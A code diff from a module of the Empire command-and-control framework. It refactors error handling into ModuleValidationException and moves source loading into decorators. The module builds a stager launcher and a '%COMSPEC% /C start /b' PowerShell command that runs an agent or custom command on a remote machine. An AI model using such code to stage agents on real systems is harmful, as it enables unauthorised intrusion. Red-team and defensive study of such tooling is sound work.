@@ -1,16 +1,20 @@
 from empire.server.common.empire import MainMenu
+from empire.server.core.exceptions import ModuleValidationException
 from empire.server.core.module_models import EmpireModule
-from empire.server.utils.module_util import handle_error_message
+from empire.server.core.module_service import auto_finalize, auto_get_source
 
 
 class Module:
     @staticmethod
+    @auto_get_source
+    @auto_finalize
     def generate(
         main_menu: MainMenu,
         module: EmpireModule,
         params: dict,
         obfuscate: bool = False,
         obfuscation_command: str = "",
+        script: str = "",
     ):
         # staging options
         listener_name = params["Listener"]
@@ -25,16 +29,6 @@ class Module:
         launcher_obfuscate = params["Obfuscate"].lower() == "true"
         launcher_obfuscate_command = params["ObfuscateCommand"]
 
-        # read in the common module source code
-        script, err = main_menu.modulesv2.get_module_source(
-            module_name=module.script_path,
-            obfuscate=obfuscate,
-            obfuscate_command=obfuscation_command,
-        )
-
-        if err:
-            return handle_error_message(err)
-
         script_end = ""
         if command != "":
             # executing a custom command on the remote machine
@@ -47,7 +41,7 @@ class Module:
 
         elif not main_menu.listenersv2.get_active_listener_by_name(listener_name):
             # not a valid listener, return nothing for the script
-            return handle_error_message("[!] Invalid listener: " + listener_name)
+            raise ModuleValidationException("Invalid listener: " + listener_name)
 
         else:
             # generate the PowerShell one-liner with all of the proper options set
@@ -56,7 +50,7 @@ class Module:
                 if main_menu.listenersv2.get_active_listener_by_name(
                     listener_name
                 ).info["Name"] not in ["HTTP[S]", "smb_pivot"]:
-                    return handle_error_message(
+                    raise ModuleValidationException(
                         "Only HTTP[S] and smb_pivot listeners are supported for C# and IronPython stagers."
                     )
 
@@ -71,7 +65,7 @@ class Module:
                 if main_menu.listenersv2.get_active_listener_by_name(
                     listener_name
                 ).info["Name"] not in ["HTTP[S]", "smb_pivot"]:
-                    return handle_error_message(
+                    raise ModuleValidationException(
                         "Only HTTP[S] and smb_pivot listeners are supported for C# and IronPython stagers."
                     )
 
@@ -96,12 +90,12 @@ class Module:
                 )
             else:
                 # with strict options this shouldn't be reached but ensures no silent failures
-                return handle_error_message(
+                raise ModuleValidationException(
                     "Invalid language for Empire Agent Selected"
                 )
 
             if launcher == "":
-                return handle_error_message("[!] Error in launcher generation.")
+                raise ModuleValidationException("Error in launcher generation.")
 
             stager_cmd = (
                 "%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\"
@@ -117,9 +111,4 @@ class Module:
             + ' completed!"'
         )
 
-        return main_menu.modulesv2.finalize_module(
-            script=script,
-            script_end=script_end,
-            obfuscate=obfuscate,
-            obfuscation_command=obfuscation_command,
-        )
+        return script, script_end
